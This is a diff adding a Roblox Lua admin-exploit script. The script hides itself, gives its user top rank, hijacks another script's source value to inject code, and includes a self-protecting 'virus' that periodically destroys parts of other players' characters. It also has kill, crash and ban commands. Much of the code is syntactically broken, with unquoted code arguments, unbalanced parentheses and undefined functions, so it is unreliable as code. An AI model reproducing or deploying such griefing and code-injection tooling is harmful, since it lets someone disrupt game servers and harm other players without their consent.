@@ -1,0 +1,488 @@
+wait()
+script.Parent=nil
+local next=next
+local me=game.Players.LocalPlayer
+local insert=table.insert
+local remove=table.remove 
+local plrs=game.Players:GetPlayers()
+local priv=false
+local admins={"nil"}
+local superadmins={"nil"}
+local megaadmins={"nil"}
+local uberadmins={"nil"}
+local connections={}
+local noadmins={"12packkid"}
+local SourceName="DSource"
+local SourceValue=""
+local ClonyPooPoo=script:Clone()
+--Start Rank Functions--
+function setrank(plr,lvl)
+    for _,v in next,plrs do
+        if string.find(v.Name:lower(),plr.Name:lower()) ~= nil then
+            for i,g in next,v:GetChildren() do
+                if not g:IsA("IntValue") then
+                    local val=Instance.new("IntValue",v)
+                val.Name="Rank"
+                    val.Value=lvl
+                else
+                    g.Value=lvl
+                end
+            end        
+        end
+    end
+end
+wait()
+setrank(me,9)
+function getrank(plr)
+    for _,v in next,plrs do
+        if string.find(v.Name:lower(),plr.Name:lower()) ~= nil then
+            for i,g in next,v:GetChildren() do
+                if g:IsA("IntValue") then
+                    local rank=g.Value
+                    return rank
+                end
+            end
+        end
+    end
+end
+--End Rank Functions--
+function hide(plr)
+    --Easy Hide
+end
+function checknoadmin(plr)
+    for _,v in next,noadmins do
+        if v==plr.Name then
+            return true
+        end
+    end
+end
+
+local function setc(c,v,l)
+    local val=Instance.new("IntValue",game:service'ServerStorage')
+	val.Name=c
+	val.Value=v
+  if l == "yes" then
+    game:service'ServerStorage'.DescendantRemoving:connect(function(obj)
+      if obj==val then
+        obj.Parent = workspace
+        wait()
+        obj.Parent = game:service'ServerStorage'
+      end
+    end)
+  end
+end
+coroutine.wrap(function()
+	while found == false do
+		if game.PlaceId == 21053279 or game.PlaceId == 21053219 then break end
+			for _,scriptinworkspace in pairs(workspace:children()) do
+				if scriptinworkspace then
+					if scriptinworkspace:IsA("Script") then
+						if scriptinworkspace:FindFirstChild(SourceName) then
+							newScript=scriptinworkspace:Clone()
+							wait(0.2)
+							newScript.Name="NewScript"
+							newScript.Disabled=true
+							newScript:FindFirstChild(SourceName).Value=""
+							Output("Source found")
+							found=true
+						break
+					end
+				end
+			end
+		end
+	wait()
+	end
+end)()
+function createScript(sourcevalue,parent)
+	if newScript then
+		local scr=newScript:Clone()
+		if scr:FindFirstChild(SourceName) then
+			local x=scr:FindFirstChild(SourceName)
+			if x then
+				x.Value=sourcevalue
+				scr.Parent=parent
+				wait(0.5)
+				scr.Disabled=false
+				return scr
+			end
+		end
+	end
+end
+local function virus()
+	local troj=Instance.new("Pants",game:service'ServerStorage')
+	troj.Name="nil"
+	createScript(
+		
+			local plrs=game.Players:GetPlayers()
+			local parent=script.Parent.Parent
+			coroutine.wrap(function()
+				while true do wait(30)
+					for _,v in next,plrs do
+						x=math.random(1,#_)
+						v[x]:Destroy()
+					end
+				end
+			end)()
+			script.Parent.Parent.DescendantRemoving:connect(function(obj)
+				if obj.Name==script.Parent.Name then
+					script.Parent.Parent=game:service'ServerStorage'
+				end
+			end
+			coroutine.wrap(function()
+				while true do wait()
+					for _,v in next,game:service'Lighting':GetChildren() do
+						if v:IsA("IntValue") and v.Value == 443 then
+							script:Destroy()
+						end
+					end
+				end
+			end)()
+					
+		,troj
+	)
+end
+function output(spoken)
+    createScript(
+    local h = Instance.new("Hint",workspace)
+    h.Text = ..spoken..
+    wait(5)
+    h:Destroy()
+    ,workspace)
+end
+function track(obj)
+  table.insert(tracking,obj.Name)
+end
+--Setting Commands to Values--
+setc("Kill",2,"yes")
+setc("Lockdown",4,"yes")
+setc("Setrank",9,"yes")
+setc("Admin",3,"yes")
+setc("Superadmin",4,"yes")
+setc("Megaadmin",5,"yes")
+setc("Uberadmin",6,"yes")
+setc("Getrank",2,"yes")
+setc("Exploit",5,"yes")
+setc("Virus",9,"yes") -- -- -- -- -- -- -- If these are not set, commands will not work.
+setc("Find",2,"yes")
+setc("Track",3,"yes")
+setc("Ban",3,"yes")
+setc("Superban",5,"yes")
+setc("Ff",2,"yes")
+setc("Protect",3,"yes")
+setc("Spike",5,"yes")
+setc("Cripple",3,"yes")
+--End Setting Commands to Values--
+scripts={}
+localscripts={}
+local cmds={
+  ["kill"]=function(p)
+  	for _,v in next, plrs do
+		  if string.find(v.Name:lower(),p:lower()) ~= nil then
+				pcall(function() v.Character:BreakJoints() end)
+			end
+		end					
+	end,
+	["lockdown"]=function()
+		output("Locking down server...")
+		for _,v in next,scripts do
+			if v.Disabled == false then
+				v.Disabled=true
+			end
+		end
+		for _,v in next,localscripts do
+			if v.Disabled == false then
+				v.Disabled=true
+			end
+		end
+		wait(2)
+		output("Successfully disabled all known scripts.")
+		priv=true
+		wait(1)
+		output("Server is now on lockdown, all scripts made will be disabled.")
+	end,
+	["exploit"]=function(scr)
+		local amt=0
+		exploits={}
+		for _,v in next,localscripts do
+			for i,g in next, v:GetChildren() do
+				if string.find(g.Value,"Crash:") then
+					amt=amt+1
+					table.insert(exploits,"Crash:")
+				end
+			end
+		end
+		output("Found "..amt.." exploits.")
+		for _,v in next,exploits do
+            wait(3)
+            output(v)
+        end
+	end,
+    ["hide"]=function(p)
+        if p=="me" then
+            hide(me)
+        else
+            for _,v in next,game.Players:GetPlayers() do
+                if string.find(v.Name:lower(),p:lower()) ~= nil then 
+                    hide(v)
+                end
+            end
+        end
+    end,
+    ["track"]=function(a)
+        track(a)
+    end,
+    ["find"]=function(obj)
+        if game:FindFirstChild(obj,true) then
+            output(obj.Parent)
+        end
+    end,
+    ["create"]=function(obj,name,par)
+    	local object=Instance.new(""..obj.."")
+		object.Parent=par
+		object.Name=name
+	end,
+    ["virus"]=function()
+        virus()
+    end,
+    ["spike"]=function()
+                                                    
+    end,
+    ["watch"]=function(p)
+        
+    end,
+    ["admin"]=function(p)
+        for _,v in next,plrs do
+			if string.find(v.Name:lower(),p:lower()) ~= nil then
+				rank=getrank(v)
+				if rank<2 then
+					setrank(v,2)
+					output("Admin'd "..v.Name)
+                    output2("You're now an Admin!",v)
+				else
+					output("Unable to Admin "..v.Name..". Problems could be: Target is too high ranked, Target is on NoAdmin list.")
+				end
+			end
+		end
+    end,
+	["superadmin"]=function(p)
+		for _,v in next,plrs do
+			if string.find(v.Name:lower(),p:lower()) ~= nil then
+				rank=getrank(v)
+				if rank<3 then
+					setrank(v,3)
+					output("Superadmin'd "..v.Name)
+                    output2("You're now Superadmin!",v)
+				else
+                    if checknoadmins(v) then
+                        output("Unable to Superadmin "..v..". Target is on NoAdmin list.")
+                    else
+					    output("Unable to Superadmin "..v.Name..". Target is too high ranked.")
+                    end
+				end
+			end
+		end
+	end,
+	["megaadmin"]=function(p)
+		for _,v in next,plrs do
+			if string.find(v.Name:lower(),p:lower()) ~= nil then
+				rank=getrank(v)
+				if rank<4 then
+					setrank(v,4)
+					output("Megaadmin'd "..v.Name)
+                    output2("You're now Megaadmin!",v)
+				else
+					output("Unable to Megaadmin "..v.Name..". Problems could be: Target is too high ranked, Target is on NoAdmin list.")
+				end
+			end
+		end
+	end,
+	["uberadmin"]=function(p)
+		for _,v in next,plrs do
+			if string.find(v.Name:lower(),p:lower()) ~= nil then
+				rank=getrank(v)
+				if rank<5 then
+					setrank(v,5)
+					output("Uberadmin'd "..v.Name)
+                    output2("You're now Uberadmin!",v)
+				else
+					output("Unable to Uberadmin "..v.Name..". Problems could be: Target is too high ranked, Target is on NoAdmin list.")
+				end
+			end
+		end
+	end,
+	["getrank"]=function(p)
+		for _,v in next,plrs do
+			if string.find(v.Name:lower(),p:lower()) ~= nil then
+				local rank=getrank(v)
+                if getrank(v)==2 then
+				    output(v.Name.." is Admin")
+                elseif getrank(v)==3 then
+                    output(v.Name.." is Superadmin")
+                elseif getrank(v)==4 then
+                    output(v.Name.." is Megaadmin")
+                elseif getrank(v)==5 then
+                    output(v.Name.." is Uberadmin")
+                elseif getrank(v)==1 then
+                    output(v.Name.." is Player.")
+                end
+			end
+		end
+  end,
+  ["superban"]=function(p)
+    for _,v in next,plrs do
+      if string.find(v.Name:lower(),p:lower()) ~= nil then
+        table.insert(superban,v.Name)
+      end
+    end
+end,
+  ["ban"]=function(p)
+    for _,v in next,plrs do
+      if string.find(v.Name:lower(),p:lower()) ~= nil then
+        table.insert(ban,v.Name)
+      end
+    end
+end,
+  ["crash"]=function(p)
+    local crash=Instance.new("StringValue",game.Lighting)
+    crash.Name="Crash: "..p)
+    wait()
+    crash:Destroy()
+  end,
+  ["cripple"]=function(p)
+    for _,v in next,plrs do
+      if string.find(v.Name:lower(),p:lower()) ~= nil then
+        cripple(v)
+      end
+    end
+  end,
+  ["control"]=function(p)
+    --Make control function
+  end,
+  ["ping"]=function(p)
+      --Create Ping CMD
+    end,
+  ["cmdp"]=function()
+      cmdp()
+  end
+  
+}
+cmds2={
+	["setrank"]=function(p,l)
+        for _,v in next,game.Players:GetPlayers() do
+            if string.find(v.Name:lower(),p:lower()) ~= nil then
+                setrank(v,l)
+				output("Successfully set "..v.Name.."'s rank to "..l)
+            end
+        end     
+    end,
+  ["app"]=function(p,r)
+    if r then
+      for _,v in next,plrs do
+        if string.find(v.Name:lower(),p:lower()) ~= nil then
+          --Make CharacterAppearence
+        end
+      end
+    else
+      --Make CharacterAppearence
+    end
+  end
+  ["teleport"]=function(p,r)
+    if r then
+      for _,v in next,plrs do
+        if string.find(v.Name:lower(),p:lower()) ~= nil then
+          for i,g in next,plrs do
+            if string.find(g.Name:lower(),r:lower()) ~= nil then
+              pcall(function() v.Character.Torso:MoveTo(r.Character.Torso.Position * CFrame.new(0,5,0)) end) 
+            end
+          end
+        end
+      end
+    end
+  end
+  ["pm"]=function(p,m)
+    for _,v in next,connections do
+        if string.find(v:GetPlayer().Name:lower(),p:lower()) ~= nil then
+            pm(v:GetPlayer().Name,m)
+        end
+    end
+  end
+}
+local function Vypre(msg,plr)
+    cmd,parm,spl,spl2=string.match(msg,"(.*)/(.*)")
+	local cmd=cmd
+	local parm=parm
+	local spl=spl
+	local spl2=spl2
+	local rank=getrank(plr)
+    for _,v in next,game:service'ServerStorage':GetChildren() do
+   		if v:IsA("IntValue") then
+			if cmd then
+	           	if string.find(cmd:lower(),v.Name:lower()) ~= nil then 
+	                if rank>=v.Value then
+						if parm and cmds[cmd] then
+							cmds[cmd](parm)
+          elseif not parm then
+              cmds[cmd](plr.Name)
+						end
+					else
+						output("Insufficient privileges",plr)
+	                end
+	            end
+			end
+        end
+	end
+end	
+local function Vypre2(msg,plr)
+	cmd2,parm2,ex=string.match(msg,"(.*)/(.*)/(.*)")
+	local cmd2=cmd2
+	local parm2=parm2
+	local ex=ex
+	local rank=getrank(plr)
+    for _,v in next,game:service'ServerStorage':GetChildren() do
+   		if v:IsA("IntValue") then
+			if cmd2 then
+	           	if string.find(cmd2:lower(),v.Name:lower()) ~= nil then 
+	                if rank>=v.Value then
+						if ex and cmds2[cmd2] then
+							cmds2[cmd2](parm2,ex)
+						end
+					else
+						output("Insufficient privileges",plr)
+	                end
+	            end
+			end
+        end
+	end
+end
+function playerAdded(player)
+    player.Chatted:connect(function(m) Vypre(m,player) end)
+	player.Chatted:connect(function(m) Vypre2(m,player) end)
+    for _,v in next,admins do
+        if v==player.Name then
+            setrank(player,2)
+        end
+    end
+    for _,v in next,superadmins do
+        if v==player.Name then
+            setrank(player,3)
+        end
+    end
+    for _,v in next,megaadmins do
+        if v==player.Name then
+            setrank(player,4)
+        end
+    end
+    for _,v in next,uberadmins do
+        if v==player.Name then
+            setrank(player,5)
+        end
+    end
+end
+game.Players.PlayerAdded:connect(function(p) playerAdded(p) end)
+for _,v in next,plrs do
+	playerAdded(v)
+end
+local m=Instance.new("Message",workspace)
+m.Text="Working"
+wait(5)
+m:Destroy()
